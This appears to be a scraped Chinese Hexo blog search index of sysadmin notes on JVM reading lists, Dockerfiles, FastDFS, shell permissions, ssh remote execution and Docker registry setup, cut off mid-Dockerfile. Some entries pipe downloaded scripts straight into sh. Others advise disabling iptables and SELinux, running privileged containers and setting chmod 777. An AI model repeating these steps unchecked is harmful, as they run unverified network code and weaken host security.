什么时候进行垃圾回收 JVM 源码分析系列 深入分析 Object.finalize 方法的实现原理 JVM 源码分析之 Object.wait/notify 实现 JVM 源码分析之 java 对象头实现 JVM 源码分析之 synchronized 实现 JVM 源码分析之 Java 类的加载过程 JVM 源码分析之 Java 对象的创建过程 JVM 源码分析之 JVM 启动流程 JVM 源码分析之堆内存的初始化 JVM 源码分析之 Java 对象的内存分配 JVM 源码分析之如何触发并执行 GC 线程 JVM 源码分析之垃圾收集的执行过程 JVM 源码分析之新生代 DefNewGeneration 的实现 JVM 源码分析之老年代 TenuredGeneration 的垃圾回收算法实现 JVM 源码分析之安全点 safepointJVM 源码分析之线程局部缓存 TLAB JVM 源码分析之不要被 GC 日志的表面现象迷惑 JVM 源码分析之 YGC 的来龙去脉 JVM 源码分析之跨代引用 CardTable JVM 源码分析之 System.gc() JVM 源码分析之 GC locker 深度分析 JVM 源码分析之由 JNI 操作引起的迷惑性 GC 从 JVM 角度看看 Java 的 clone 操作 JVM学习目录1. 【JVM】JVM系列之JVM体系（一） 2. 【JVM】JVM系列之垃圾回收（二） 3. 【JVM】JVM系列之Class文件（三） 4. 【JVM】JVM系列之类加载机制（四） 5. 【JVM】JVM系列之执行引擎（五） 6. 【JVM】JVM系列之内存模型（六）","categories":[{"name":"java","slug":"java","permalink":"https://wuhaocn.github.io/categories/java/"}],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://wuhaocn.github.io/tags/JVM/"}]},{"title":"hexo-安装","slug":"tool/hexo-install","date":"2021-07-26T01:33:15.069Z","updated":"2021-07-26T01:33:15.069Z","comments":true,"path":"2021/07/26/tool/hexo-install/","link":"","permalink":"https://wuhaocn.github.io/2021/07/26/tool/hexo-install/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info.If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"","slug":"devops/docker/docker-package/dockerfiles/ubuntu/im/readme","date":"2021-06-18T10:54:51.877Z","updated":"2021-06-18T10:54:51.877Z","comments":true,"path":"2021/06/18/devops/docker/docker-package/dockerfiles/ubuntu/im/readme/","link":"","permalink":"https://wuhaocn.github.io/2021/06/18/devops/docker/docker-package/dockerfiles/ubuntu/im/readme/","excerpt":"","text":"java appjava im 应用","categories":[],"tags":[]},{"title":"","slug":"devops/docker/docker-package/dockerfiles/ubuntu/web/readme","date":"2021-06-18T10:54:51.868Z","updated":"2021-06-18T10:54:51.868Z","comments":true,"path":"2021/06/18/devops/docker/docker-package/dockerfiles/ubuntu/web/readme/","link":"","permalink":"https://wuhaocn.github.io/2021/06/18/devops/docker/docker-package/dockerfiles/ubuntu/web/readme/","excerpt":"","text":"java appjava web 应用","categories":[],"tags":[]},{"title":"","slug":"devops/docker/docker-package/dockerfiles/armjava/readme","date":"2021-06-17T11:02:52.042Z","updated":"2021-06-17T11:02:52.042Z","comments":true,"path":"2021/06/17/devops/docker/docker-package/dockerfiles/armjava/readme/","link":"","permalink":"https://wuhaocn.github.io/2021/06/17/devops/docker/docker-package/dockerfiles/armjava/readme/","excerpt":"","text":"执行步骤1. ./build-clean.shdockerfile 解析12345678910111213141516171819202122FROM java:8MAINTAINER wuhaotx&lt;wuhaotx@feinno.com&gt;RUN mv /etc/apt/sources.list /etc/apt/sources.list.bak &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib&quot; &gt;&gt;/etc/apt/sources.listRUN cat /etc/apt/sources.list//更新源RUN apt-get update//安装vimRUN apt-get -y install vim//安装netstat等RUN apt-get -y install net-tools","categories":[],"tags":[]},{"title":"","slug":"devops/docker/docker-package/dockerfiles/fastdfs/readme","date":"2021-06-17T11:02:52.036Z","updated":"2021-06-17T11:02:52.036Z","comments":true,"path":"2021/06/17/devops/docker/docker-package/dockerfiles/fastdfs/readme/","link":"","permalink":"https://wuhaocn.github.io/2021/06/17/devops/docker/docker-package/dockerfiles/fastdfs/readme/","excerpt":"","text":"FastDFS 集群 docker 构建1. docker 源1.1.使用season/fastdfs作为FastDFS源! season/fastdfs 1.2.Run as shell启动client做相关测试和镜像文件查看 docker run -ti --name fdfs_sh --net=host season/fastdfs sh 1.3.源镜像中会执行entrypoint.sh脚本进行FastDFS初始化工作 dockerfile 解析123456789101112131415161718192021222324252627282930# FastDFS基础镜像FROM season/fastdfs# MAINTAINERMAINTAINER wuhaocn@126.comVOLUME [&quot;/tmp&quot;]RUN mv /etc/apt/sources.list /etc/apt/sources.list.bak &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib&quot; &gt;&gt;/etc/apt/sources.listRUN mkdir -p /data/fastdfs/RUN mkdir -p /data/fastdfs/permfile//将自定义storage.conf拷贝到镜像中替换源镜像中/fdfs_conf/storage.confCOPY conf/storage.conf /fdfs_conf/storage.conf//更新源RUN apt-get update//安装vimRUN apt-get -y install vim//安装netstat等RUN apt-get -y install net-tools 3.FastDFS 补充3.1.通过storage.conf指定不同store_path store_path0=/data/fastdfs store_path1=/data/fastdfs/permfile 3.2.通过storage.conf设置tracker_server地址 3.3.fastdfs的storage server的状态查询 # FDFS_STORAGE_STATUS：INIT :初始化，尚未得到同步已有数据的源服务器 # FDFS_STORAGE_STATUS：WAIT_SYNC :等待同步，已得到同步已有数据的源服务器 # FDFS_STORAGE_STATUS：SYNCING :同步中 # FDFS_STORAGE_STATUS：DELETED :已删除，该服务器从本组中摘除 # FDFS_STORAGE_STATUS：OFFLINE :离线 # FDFS_STORAGE_STATUS：ONLINE :在线，尚不能提供服务 # FDFS_STORAGE_STATUS：ACTIVE :在线，可以提供服务 使用命令：[root@localhost bin]# fdfs_monitor /etc/fdfs/client.conf 4.注意事项4.1.生产环境FastDFS部署必须要进行数据挂载至硬盘 4.2.先部署tracker,再进行storage部署 4.3.检查状态 可以使用 fdfs_monitor 来查看一下storage的状态，看是否已经成功注册到了tracker [......]# fdfs_monitor /etc/fdfs/storage.conf #也可以以下命令来监控服务器的状态： [......]# fdfs_monitor /etc/fdfs/client.conf","categories":[],"tags":[]},{"title":"","slug":"devops/docker/docker-package/dockerfiles/java/readme","date":"2021-06-17T11:02:52.029Z","updated":"2021-06-17T11:02:52.029Z","comments":true,"path":"2021/06/17/devops/docker/docker-package/dockerfiles/java/readme/","link":"","permalink":"https://wuhaocn.github.io/2021/06/17/devops/docker/docker-package/dockerfiles/java/readme/","excerpt":"","text":"执行步骤1. ./build-clean.shdockerfile 解析12345678910111213141516171819202122FROM java:8MAINTAINER wuhaotx&lt;wuhaotx@feinno.com&gt;RUN mv /etc/apt/sources.list /etc/apt/sources.list.bak &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib&quot; &gt;&gt;/etc/apt/sources.listRUN cat /etc/apt/sources.list//更新源RUN apt-get update//安装vimRUN apt-get -y install vim//安装netstat等RUN apt-get -y install net-tools","categories":[],"tags":[]},{"title":"","slug":"devops/docker/docker-package/dockerfiles/nginx/readme","date":"2021-06-17T11:02:52.021Z","updated":"2021-06-17T11:02:52.021Z","comments":true,"path":"2021/06/17/devops/docker/docker-package/dockerfiles/nginx/readme/","link":"","permalink":"https://wuhaocn.github.io/2021/06/17/devops/docker/docker-package/dockerfiles/nginx/readme/","excerpt":"","text":"参照：https://github.com/openresty/docker-openresty/blob/1.9.15.1/centos/Dockerfile 默认版本不支持 TCP，需要查看 git 源码 centos：为官方源码,二次打包 nginx-fusion.conf","categories":[],"tags":[]},{"title":"常用shell命令","slug":"language/shell/常用shell命令","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-27T08:18:30.329Z","comments":true,"path":"2021/06/15/language/shell/常用shell命令/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/%E5%B8%B8%E7%94%A8shell%E5%91%BD%E4%BB%A4/","excerpt":"","text":"查找指定文件并返回结果dbhost=`grep -c &quot;nihao&quot; servicesetting.properties` echo $dbres if [ $dbres -eq &#39;0&#39; ]; then echo &quot;nihao Not Found&quot; else echo &quot;nihao Found!&quot; fi 判断变量为空加上引号判断 if [ ! -n &quot;$para1&quot; ]; then echo &quot;IS NULL&quot; else echo &quot;NOT NULL&quot; fi 【输出结果】&quot;IS NULL&quot; 直接通过变量判断 para1= if [ ! $para1 ]; then echo &quot;IS NULL&quot; else echo &quot;NOT NULL&quot; fi 【输出结果】&quot;IS NULL&quot; 使用 test 判断 dmin= if test -z &quot;$dmin&quot; then echo &quot;dmin is not set!&quot; else echo &quot;dmin is set !&quot; fi 【输出结果】&quot;dmin is not set!&quot; 使用””判断 dmin= if [ &quot;$dmin&quot; = &quot;&quot; ] then echo &quot;dmin is not set!&quot; else echo &quot;dmin is set !&quot; fi 【输出结果】&quot;dmin is not set!&quot;","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"修改服务端IP","slug":"language/shell/修改机器服务端IP","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-27T08:18:30.363Z","comments":true,"path":"2021/06/15/language/shell/修改机器服务端IP/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/%E4%BF%AE%E6%94%B9%E6%9C%BA%E5%99%A8%E6%9C%8D%E5%8A%A1%E7%AB%AFIP/","excerpt":"","text":"1.查看并修改vim /etc/sysconfig/network-scripts/ifcfg-bond0 123456789[root@xxx-001 ~]# cat /etc/sysconfig/network-scripts/ifcfg-bond0DEVICE=bond0ONBOOT=yesBOOTPROTO=noneIPADDR=172.21.77.1NETMASK=255.255.255.192GATEWAY=172.21.77.62BONDING_OPTS=&quot;mode=1 miimon=100 primary=eth0&quot;USERCTL=no 2.重启service network restart 3.备注---修改ip地址--- 即时生效:# ifconfig eth0 192.168.1.155 netmask 255.255.255.0 重启生效:修改vi /etc/sysconfig/network-scripts/ifcfg-eth0 ---修改default gateway--- 即时生效:# route add default gw 192.168.1.1 重启生效:修改vi /etc/sysconfig/network-scripts/ifcfg-eth0 ---修改dns--- 修改vi /etc/resolv.conf #修改后即时生效，重启同样有效 ---修改host name--- 即时生效:# hostname test1 重启生效:修改vi /etc/sysconfig/network","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"工具脚本","slug":"language/shell/工具脚本","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-26T02:20:23.975Z","comments":true,"path":"2021/06/15/language/shell/工具脚本/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/%E5%B7%A5%E5%85%B7%E8%84%9A%E6%9C%AC/","excerpt":"","text":"定时任务123crontab -e*/1 * * * * /home/5g-doc/doc-update.sh 请参考：https://www.runoob.com/linux/linux-comm-crontab.html","categories":[{"name":"编程语言 - shell","slug":"编程语言-shell","permalink":"https://wuhaocn.github.io/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80-shell/"}],"tags":[]},{"title":"权限设置shell命令","slug":"language/shell/权限设置shell命令","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-27T08:18:30.337Z","comments":true,"path":"2021/06/15/language/shell/权限设置shell命令/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/%E6%9D%83%E9%99%90%E8%AE%BE%E7%BD%AEshell%E5%91%BD%E4%BB%A4/","excerpt":"","text":"权限篇 chmod chgrp chownchmod 777 文件名 chgrp 用户名 文件名 -R chown 用户名 文件名 -R -R表示递归目录下所有文件 一、修改文件所属组群——chgrp 修改文件所属组群很简单-chgrp命令，就是change group的缩写（我们可以利用这些来记忆命令） 语法：chgrp 组群 文件名/目录 举例： [root@redhat ~]# groupadd groupa [root@redhat ~]# groupadd groupb [root@redhat ~]# useradd -g groupa zgz [root@redhat ~]# su - zgz [zgz@redhat ~]$ touch filea [zgz@redhat ~]$ touch fileb [zgz@redhat ~]$ ls -l total 8 -rw-r--r-- 1 zgz groupa 0 Sep 26 05:48 filea -rw-r--r-- 1 zgz groupa 0 Sep 26 05:50 fileb -- [root@redhat zgz]# chgrp groupb filea --改变filea所属群组 [root@redhat zgz]# ls -l total 8 -rw-r--r-- 1 zgz groupb 0 Sep 26 05:48 filea -rw-r--r-- 1 zgz groupa 0 Sep 26 05:50 fileb 二、修改文件拥有者——chown 修改组群的命令使chgrp，即change group，那么修改文件拥有者的命令自然就是chown，即change owner。chown功能很多，不仅仅能更改文件拥有者，还可以修改文件所属组群。如果需要将某一目录下的所有文件都改变其拥有者，可以使用-R参数。 语法如下： chown [-R] 账号名称 文件/目录 chown [-R] 账号名称:组群 文件/目录 举例： [root@redhat zgz]# ls -l total 20 -rw-r--r-- 1 zgz groupb 0 Sep 26 05:48 filea -rw-r--r-- 1 zgz groupa 3 Sep 26 05:59 fileb drwxr-xr-x 2 zgz groupa 4096 Sep 26 06:07 zgzdir [root@redhat zgz]# chown myy fileb --修改fileb的拥有者为myy [root@redhat zgz]# ls -l total 20 -rw-r--r-- 1 zgz groupb 0 Sep 26 05:48 filea -rw-r--r-- 1 myy groupa 3 Sep 26 05:59 fileb drwxr-xr-x 2 zgz groupa 4096 Sep 26 06:07 zgzdir [root@redhat zgz]# chown myy:groupa filea --修改filea的拥有者为myy，并且同 [root@redhat zgz]# ls -l时修改组群为groupa total 20 -rw-r--r-- 1 myy groupa 0 Sep 26 05:48 filea -rw-r--r-- 1 myy groupa 3 Sep 26 05:59 fileb drwxr-xr-x 2 zgz groupa 4096 Sep 26 06:07 zgzdir [root@redhat zgz]# chown -R myy zgzdir 同时改变其下所有文件拥有者 total 20 -rw-r--r-- 1 myy groupa 0 Sep 26 05:48 filea -rw-r--r-- 1 myy groupa 3 Sep 26 05:59 fileb drwxr-xr-x 2 myy groupa 4096 Sep 26 06:07 zgzdir [root@redhat zgz]# cd zgzdir/ [root@redhat zgzdir]# ls -l total 8 -rw-r--r-- 1 myy groupa 0 Sep 26 06:07 filec -rw-r--r-- 1 myy groupa 0 Sep 26 06:07 filed 三、改变文件权限——chmod 1.用数字来改变文件权限 我们已经了解了-rw-r--r-- 所表示含义，linux为每一个权限分配一个固定的数字： r： 4（读权限） w： 2（写权限） x： 1（执行权限） 我们再将这些数字相加，就得到每一组的权限值，例如 -rw-r--r-- 1 myy groupa 0 Sep 26 06:07 filed 第一组（user）：rw- = 4+2+0 = 6 第二组（group）：r-- = 4+0+0 = 4 第三组（others）：r-- = 4+0+0 = 4 那么644就是fileb权限的数字表示值。 如果我们想改变某一个文件的权限，首先需要将权限转化为数字组合，例如我们想得到-rwxrw-r--，那么就应该得到数字组合：[4+2+1][4+2+0][4+0+0]=764,然后再用chmod命令去修改 chmod语法： chmod xyz 文件/目录 举例： [root@redhat zgzdir]# ls -l total 8 -rw-r--r-- 1 myy groupa 0 Sep 26 06:07 filec -rw-r--r-- 1 myy groupa 0 Sep 26 06:07 filed [root@redhat zgzdir]# chmod 777 filec--将filec的权限改变为777 [root@redhat zgzdir]# ls -l total 8 -rwxrwxrwx 1 myy groupa 0 Sep 26 06:07 filec -rw-r--r-- 1 myy groupa 0 Sep 26 06:07 filed [root@redhat zgzdir]# chmod 750 filed--将filed的权限改变为750 [root@redhat zgzdir]# ls -l total 8 -rwxrwxrwx 1 myy groupa 0 Sep 26 06:07 filec -rwxr-x--- 1 myy groupa 0 Sep 26 06:07 filed 2、用字符来改变文件权限 还有一种改变权限的方法，我们已经了解到，文件权限分为三组，分别是user，group，others，那么我们可以用u，g,o分别代表三组，另外，a（all）代表全部，而权限属性即可用r，w，x三个字符来表示，那么请看下面的语法： chmod u/g/o/a +(加入)/-(除去)/=(设定) r/w/x 文件或者目录 举例： 我们想使filed文件得到：u：可读，可写，可执行 g，o：可读，可执行 [root@redhat zgzdir]# ls -l total 8 -rwxrwxrwx 1 myy groupa 0 Sep 26 06:07 filec -rwxr-x--- 1 myy groupa 0 Sep 26 06:07 filed [root@redhat zgzdir]# chmod u=rwx,go=rx filed--修改filed的文件属性 [root@redhat zgzdir]# ls -l total 8 -rwxrwxrwx 1 myy groupa 0 Sep 26 06:07 filec -rwxr-xr-x 1 myy groupa 0 Sep 26 06:07 filed 其中g和o也可以用“，”分开来分别设定。 假设目前我不知道各组权限如何，只是想让所有组都增加“x”权限，那么我们可以用chmod a+x filename来实现， 举例： [root@redhat zgz]# ls -l total 24 -rw-r--r-- 1 myy groupa 0 Sep 26 05:48 filea -rw-r--r-- 1 myy groupa 3 Sep 26 05:59 fileb -rw-r--r-- 1 zgz groupa 0 Sep 26 06:39 fileg drwxr-xr-x 2 myy groupa 4096 Sep 26 06:07 zgzdir [root@redhat zgz]# chmod a+x filea--修改filea的文件属性，所有组都增加“x”权限 [root@redhat zgz]# ls -l total 24 -rwxr-xr-x 1 myy groupa 0 Sep 26 05:48 filea -rw-r--r-- 1 myy groupa 3 Sep 26 05:59 fileb -rw-r--r-- 1 zgz groupa 0 Sep 26 06:39 fileg drwxr-xr-x 2 myy groupa 4096 Sep 26 06:07 zgzdir 如果想除去某一权限，可以用“-”来操作， 举例： [root@redhat zgz]# ls -l total 24 -rwxr-xr-x 1 myy groupa 0 Sep 26 05:48 filea -rw-r--r-- 1 myy groupa 3 Sep 26 05:59 fileb -rw-r--r-- 1 zgz groupa 0 Sep 26 06:39 fileg drwxr-xr-x 2 myy groupa 4096 Sep 26 06:07 zgzdir [root@redhat zgz]# chmod a-x filea-修改filea文件属性所有组都除去“x”权限 [root@redhat zgz]# ls -l total 24 -rw-r--r-- 1 myy groupa 0 Sep 26 05:48 filea -rw-r--r-- 1 myy groupa 3 Sep 26 05:59 fileb -rw-r--r-- 1 zgz groupa 0 Sep 26 06:39 fileg drwxr-xr-x 2 myy groupa 4096 Sep 26 06:07 zgzdir [root@redhat zgz]# 友情提醒： chgrp，chown，chmod这些命令默认的情况下只有root有权限执行，大家有时可能会用普通账户去修改文件权限，linux会提示你没有这个权限。因此大家一定要注意当前用户，例如： [zgz@redhat ~]$ chgrp groupb filea chgrp: changing group of `filea&#39;: Operation not permitted --zgz没有权限来改变‘filea’的组群","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"系统日志","slug":"language/shell/日志相关","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-27T08:18:30.348Z","comments":true,"path":"2021/06/15/language/shell/日志相关/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/%E6%97%A5%E5%BF%97%E7%9B%B8%E5%85%B3/","excerpt":"","text":"####系统日志/var/log 为系统日志/var/log/supervisor/","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"Shell关闭防火墙","slug":"language/shell/linux防火墙","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-27T08:18:30.359Z","comments":true,"path":"2021/06/15/language/shell/linux防火墙/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/linux%E9%98%B2%E7%81%AB%E5%A2%99/","excerpt":"","text":"Redhat6.x 关闭防火墙的方法关闭防火墙的方法为： 1. 永久性生效 开启：chkconfig iptables on 关闭：chkconfig iptables off 2. 即时生效，重启后失效 开启：service iptables start 关闭：service iptables stop 需要说明的是对于 Linux 下的其它服务都可以用以上命令执行开启和关闭操作 补充： a. 防火墙还需要关闭ipv6的防火墙： chkconfig ip6tables off 并且可以通过如下命令查看状态： chkconfig --list iptables b. selinux状态可以通过以下命令查看： sestatus","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"Shell远程执行命令","slug":"language/shell/远程执行","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-27T08:18:30.354Z","comments":true,"path":"2021/06/15/language/shell/远程执行/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/","excerpt":"","text":"Linux Shell 远程执行命令（命令行与脚本方式）shell远程执行： 经常需要远程到其他节点上执行一些shell命令，如果分别ssh到每台主机上再去执行很麻烦，因此能有个集中管理的方式就好了。一下介绍两种shell命令远程执行的方法。 前提条件： 配置ssh免密码登陆 对于简单的命令： 如果是简单执行几个命令，则： ssh user@remoteNode &quot;cd /home ; ls&quot; ssh root@10.10.220.90 &quot;cd /home ; ls&quot; 基本能完成常用的对于远程节点的管理了，几个注意的点： 双引号，必须有。如果不加双引号，第二个ls命令在本地执行 分号，两个命令之间用分号隔开 对于脚本的方式： 有些远程执行的命令内容较多，单一命令无法完成，考虑脚本方式实现： 复制代码 #!/bin/bash ssh user@remoteNode &gt; /dev/null 2&gt;&amp;1 &lt;&lt; eeooff cd /home touch abcdefg.txt exit eeooff echo done! 复制代码 远程执行的内容在“&lt;&lt; eeooff ” 至“ eeooff ”之间，在远程机器上的操作就位于其中，注意的点： &lt;&lt; eeooff，ssh后直到遇到eeooff这样的内容结束，eeooff可以随便修改成其他形式。 重定向目的在于不显示远程的输出了 在结束前，加exit退出远程节点","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"查看系统属性","slug":"language/shell/系统属性相关","date":"2021-06-15T02:06:16.600Z","updated":"2021-07-27T08:18:30.343Z","comments":true,"path":"2021/06/15/language/shell/系统属性相关/","link":"","permalink":"https://wuhaocn.github.io/2021/06/15/language/shell/%E7%B3%BB%E7%BB%9F%E5%B1%9E%E6%80%A7%E7%9B%B8%E5%85%B3/","excerpt":"","text":"查看系统属性1.查看 Linux 内核版本命令1.uname -alinux-onss:~ # uname -a Linux linux-onss 4.4.73-5-default #1 SMP Tue Jul 4 15:33:39 UTC 2017 (b7ce4e4) x86_64 x86_64 x86_64 GNU/Linux 2.cat /proc/versioncat /proc/version Linux version 4.4.73-5-default (geeko@buildhost) (gcc version 4.8.5 (SUSE Linux) ) #1 SMP Tue Jul 4 15:33:39 UTC 2017 (b7ce4e4) 2.查看 Linux 系统版本的命令1.lsb_release -a即可列出所有版本信息，这个命令适用于所有的Linux发行版，包括RedHat、SUSE、Debian…等发行版 lsb_release -a LSB Version: n/a Distributor ID: SUSE Description: SUSE Linux Enterprise Server 12 SP3 Release: 12.3 Codename: n/a 2.cat /etc/issue此命令也适用于所有的Linux发行版。 cat /etc/issue Welcome to SUSE Linux Enterprise Server 12 SP3 (x86_64) - Kernel \\r (\\l). 3.cat /etc/redhat-release这种方法只适合Redhat系的Linux： cat /etc/redhat-release Red Hat Enterprise Linux Server release 6.2 (Santiago) 4.查看硬件信息请参考： https://www.cnblogs.com/cloudos/p/8416415.html","categories":[{"name":"linux","slug":"linux","permalink":"https://wuhaocn.github.io/categories/linux/"}],"tags":[]},{"title":"基础环境","slug":"devops/docker/基础环境","date":"2021-05-15T04:08:19.160Z","updated":"2021-08-31T12:00:21.650Z","comments":true,"path":"2021/05/15/devops/docker/基础环境/","link":"","permalink":"https://wuhaocn.github.io/2021/05/15/devops/docker/%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/","excerpt":"","text":"docker 环境搭建ubuntu1234567891011121314151617181920docker 安装sudo apt-get updatesudo apt install docker.iosudo groupadd dockerdocker pssudo usermod -aG docker $USERsudo vim /etc/docker/daemon.json root@user1-virtual-machine:~# cat /etc/docker/daemon.json&#123; &quot;storage-driver&quot;:&quot;overlay&quot;, &quot;insecure-registries&quot;: [&quot;10.10.208.193:5000&quot;]&#125;sudo service docker restart centos123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960简单安装：curl -sSL https://get.daocloud.io/docker | sh其他详细：1. 安装docker-yum 【centos7】 sudo yum install docker 【centos6】 修改yum源：参考/centos-6-yum源 # yum install device-mapper-libs yum upgrade device-mapper-libs yum update--skip-broke rpm -Uvh http://ftp.riken.jp/Linux/fedora/epel/6Server/x86_64/epel-release-6-8.noarch.rpm yum install docker-io ubuntu: apt-get update apt-get install apt-transport-https ca-certificates wget -qO- https://get.docker.com/ | sh service docker start2. 指定私库 修改/etc/docker/daemon.json文件 #vi /etc/docker/daemon.json &#123; &quot;insecure-registries&quot;: [&quot;10.10.208.193:5000&quot;] &#125; #这个现网使用出错 #&#123; # &quot;storage-driver&quot;:&quot;overlay&quot;, # &quot;insecure-registries&quot;: [&quot;10.10.208.193:5000&quot;] #&#125; cent-os-6 /etc/sysconfig/docker other_args=&#x27;--insecure-registry 10.10.208.193:5000&#x27; DOCKER_CERT_PATH=/etc/docker ADD_REGISTRY=&#x27;--add-registry 10.10.208.193:5000&#x27; # Resolves: rhbz#1176302 (docker issue #407) DOCKER_NOWARN_KERNEL_VERSION=13. 修改存储位置 修改docker.service文件，使用-g参数指定存储位置 vi /usr/lib/systemd/system/docker.service ExecStart=/usr/bin/dockerd --graph /data/docker4.配置生效 #reload配置文件 systemctl daemon-reload #重启docker systemctl restart docker #查看 Docker Root Dir: /var/lib/docker是否改成设定的目录/new-path/docker docker info Docker Root Dir: /data/docker #10.10.208.193 #systemctl daemon-reload # docker registry1.映射开发环境使用 12345678910docker run -itd --name registry --restart=always -p 5000:5000 -v /registry:/var/lib/registry registry:2docker stop registrydocker rm registrydocker run -itd --name registry --restart=always -p 5000:5000 registry:2docker stop registry-webdocker rm registry-webdocker run -d -p 15000:8080 --name registry-web --link registry -e REGISTRY_URL=http://registry:5000/v2 -e REGISTRY_NAME=localhost:5000 hyper/docker-registry-webdocker run -p 8080:8080 -e REG1=http://10.3.4.111:5000/v2/ atcol/docker-registry-ui 2.无映射本机测试临时使用 123docker stop registrydocker rm registrydocker run -d --name registry --restart=always -p 5000:5000 registry:2 基础环境备注1234567891，在运行容器的时候，给容器加特权：示例：docker run -i -t --privileged=true -v /home/docs:/src waterchestnut/nodejs:0.12.02，临时关闭selinux：示例：su -c &quot;setenforce 0&quot;之后执行：docker run -i -t -v /home/docs:/src waterchestnut/nodejs:0.12.0注意：之后要记得重新开启selinux，命令：su -c &quot;setenforce 1&quot;3，添加selinux规则，将要挂载的目录添加到白名单：示例：chcon -Rt svirt_sandbox_file_t /home/docs之后执行：docker run -i -t -v /home/docs:/src waterchestnut/nodejs:0.12.0","categories":[{"name":"devops","slug":"devops","permalink":"https://wuhaocn.github.io/categories/devops/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wuhaocn.github.io/tags/docker/"}]},{"title":"","slug":"devops/docker/docker-package/docker-build-java","date":"2021-01-05T12:05:13.000Z","updated":"2021-01-05T12:05:13.000Z","comments":true,"path":"2021/01/05/devops/docker/docker-package/docker-build-java/","link":"","permalink":"https://wuhaocn.github.io/2021/01/05/devops/docker/docker-package/docker-build-java/","excerpt":"","text":"docker 打包运行参照1. 目录结构 2. 打包流程2.1. docker 本地打包规范参照docker常用套路,需具备以下基本条件 1. docker基础环境 1. Dockerfile：用于打包特定镜像 2. run.sh：用于启动服务 3. build.gradle (java服务必须) 4. docker-clean-build.sh (快捷打包) 5. docker-xxx-dev.sh （快捷运行） 2.2. docker 基础环境2.2.1 安装（可自行搜索） yum install docker (centos7) apt-get install docker (ubuntu) 下载安装包（windows 、mac） 2.2.2.1 配置私服【linux】 修改/etc/docker/daemon.json文件 #vi /etc/docker/daemon.json &#123; &quot;insecure-registries&quot;: [&quot;10.10.208.193:5000&quot;] &#125; 重启docker 2.2.2.2 配置私服【mac】 2.3. DockerfileDockerfile 示例 1 1234567891011//官方基础镜像，打包之后目录未分开#基础镜像FROM java:8VOLUME [&quot;/tmp&quot;]ADD ./* 